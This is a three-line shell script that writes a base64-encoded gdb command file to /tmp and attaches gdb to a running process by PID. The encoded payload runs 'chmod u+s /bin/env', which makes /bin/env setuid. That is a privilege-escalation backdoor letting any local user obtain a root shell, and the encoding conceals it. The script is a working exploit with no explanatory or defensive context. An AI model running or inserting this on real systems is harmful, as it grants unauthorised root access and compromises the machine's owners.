#!/bin/sh
/bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file

/usr/bin/gdb -pid 113757 --command=/tmp/gdb_file
